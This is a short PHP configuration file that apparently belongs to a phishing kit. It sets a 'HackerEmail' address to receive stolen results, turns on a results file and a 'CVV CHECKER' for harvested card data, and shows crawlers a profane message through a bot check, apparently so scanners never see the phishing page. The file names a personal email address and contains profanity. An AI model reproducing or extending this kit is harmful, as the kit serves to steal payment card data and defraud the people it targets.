<?php 

session_start();
error_reporting(E_ALL^E_NOTICE);
#####################################################################################################
# Includes #
include 'functions.php';
include 'HTML.php';
include 'CSS.php';
include 'JS.php';
#####################################################################################################
# Your Information #
$HackerName = "";
# You can put unlimited emails like this a@one.com,b@two.com,...
$HackerEmail = "business.mahmoud@gmail.com";  

#####################################################################################################
# Other Settings #
$m2 = 1; # Text Rezult | Found in /rezmdf.html! 
$m3 = 1; # CVV CHECKER ! 
date_default_timezone_set("Africa/Tunis");
#####################################################################################################
if (is_bot()) {
    echo "Hello Bitch Boots | I FUCKING LOVE YOU HAHAHAHAHAHAHA <3";
    exit;
}?>